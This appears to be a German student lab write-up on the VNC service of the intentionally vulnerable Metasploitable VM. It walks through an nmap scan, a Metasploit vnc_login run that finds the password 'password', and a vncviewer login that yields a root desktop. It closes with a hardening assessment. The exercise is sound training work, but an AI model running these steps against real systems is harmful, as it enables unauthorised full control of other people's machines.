## 1) Ziel der Übung

In dieser Übung soll der Dienst **VNC (Virtual Network Computing)** auf der Metasploitable-VM untersucht werden. Ziel ist es, zu verstehen, wie VNC funktioniert und wie man mit Programmen wie **nmap** und **Metasploit** einfache Sicherheitsüberprüfungen durchführt. Außerdem soll getestet werden, ob man von Kali Linux aus auf das System zugreifen kann.

---

## 2) Grundlagen: VNC (Virtual Network Computing)

VNC ist ein Programm, mit dem man einen anderen Computer über das Netzwerk steuern kann. Dabei sieht man den Bildschirm des entfernten Computers und kann ihn mit Maus und Tastatur bedienen.

Wichtige Punkte zu VNC:

* Funktioniert auf verschiedenen Betriebssystemen (z. B. Linux, Windows, macOS)
* Nutzt meistens den TCP-Port **5900**
* Der Zugriff ist oft durch ein Passwort geschützt
* Schlechte Einstellungen können ein großes Sicherheitsproblem sein

Auf der Metasploitable-VM ist VNC absichtlich unsicher eingestellt, damit man solche Fehler erkennen und testen kann.

---

## 3) Nmap Scan des VNC-Dienstes

Der VNC-Dienst läuft normalerweise auf dem TCP-Port **5900**. Mit nmap kann man überprüfen, ob dieser Port offen ist und ob ein VNC-Dienst erreichbar ist.

### Scan-Befehl:

```sh
nmap -p 5900 --script=vnc-info 192.168.5.51
```

### Ergebnis:

```sh
──(kali㉿kali)-[~]
└─$ nmap -p 5900 --script=vnc-info 192.168.5.51
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 05:46 EST
Nmap scan report for 192.168.5.51
Host is up (0.0011s latency).

PORT     STATE SERVICE
5900/tcp open  vnc
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_    VNC Authentication (2)
MAC Address: 00:0C:29:26:B9:F5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
```

### Interpretation:

Der Scan zeigt, dass der Port 5900 offen ist und ein VNC-Dienst läuft. Das bedeutet, dass grundsätzlich eine Verbindung zum System möglich ist.

---

## 4) Metasploit – VNC Login Scanner

Um zu prüfen, ob der VNC-Zugang gut abgesichert ist, wird ein Scanner-Modul in Metasploit verwendet. Dieses Modul testet, ob ein Login möglich ist.

### Metasploit starten:

```sh
msfconsole
```

### Modul auswählen und starten:

```sh
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.5.51
set RPORT 5900
run
```

### Ergebnis:

```sh
[*] 192.168.5.51:5900     - Starting VNC login sweep
[+] 192.168.5.51:5900     - Login Successful: :password
[*] Auxiliary module execution completed
```

Das Ergebnis zeigt, dass man sich mit einem sehr einfachen Passwort beim VNC-Dienst anmelden kann.

---

## 5) Aufbau einer VNC-Verbindung

Da das Passwort bekannt ist, kann eine Verbindung von Kali Linux zum VNC-Dienst auf Metasploitable hergestellt werden.

### Verbindung mit vncviewer:

```sh
vncviewer 192.168.5.51:5900
```

Nach dem Start des Befehls und der Eingabe des Passworts **password** öffnet sich der grafische Desktop des Zielsystems.

Man ist als Benutzer **root** eingeloggt. Das bedeutet, dass man volle Rechte auf dem System hat.

---

## 7) Sicherheitstechnische Bewertung

Der VNC-Dienst auf Metasploitable ist sehr unsicher eingestellt. Durch ein schwaches Passwort kann sich fast jeder mit dem System verbinden und erhält sofort volle Rechte. In echten Systemen sollte VNC immer mit starken Passwörtern geschützt und nur über sichere Verbindungen verwendet werden oder ganz deaktiviert sein, wenn es nicht gebraucht wird.
